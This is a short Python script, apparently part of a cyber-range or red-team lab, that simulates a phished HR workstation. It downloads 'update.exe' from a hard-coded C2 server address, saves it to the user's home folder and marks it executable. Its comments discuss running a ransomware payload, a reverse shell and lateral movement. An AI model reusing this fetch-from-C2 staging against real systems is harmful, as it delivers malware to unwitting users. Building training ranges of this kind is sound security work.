import requests
import time
import os
import subprocess

# Configuration
C2_HOST = "172.20.0.10" # Fixed IP of C2
C2_PORT = "80"
DOWNLOAD_URL = f"http://{C2_HOST}:{C2_PORT}/download/update.exe"
TARGET_PATH = "/home/jdoe_hr/update.exe"

def simulate():
    print("HR User checking emails...")
    time.sleep(5)
    print("Email found: 'URGENT: System Update Required'")
    print("Downloading attachment...")
    
    try:
        r = requests.get(DOWNLOAD_URL, timeout=5)
        if r.status_code == 200:
            with open(TARGET_PATH, 'wb') as f:
                f.write(r.content)
            print(f"Downloaded to {TARGET_PATH}")
            
            # In this advanced version, we might NOT execute it automatically
            # to let the user do it, OR we execute it to give them the initial shell.
            # Let's assume the user IS the hacker who has gained access via this phishing.
            # But the prompt says "Entry point should be an employee machine that downloads the payload".
            # So we download it.
            
            print("User clicked the link. Malware downloaded.")
            # chmod +x
            subprocess.run(["chmod", "+x", TARGET_PATH])
            # execute
            # subprocess.Popen(["python3", TARGET_PATH]) 
            # If we run the payload, it encrypts this machine.
            # The user wants to MOVE laterally.
            # So maybe the payload opens a reverse shell?
            # For this stage, let's just leave the file there or execute it.
            
        else:
            print("Download failed.")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    simulate()
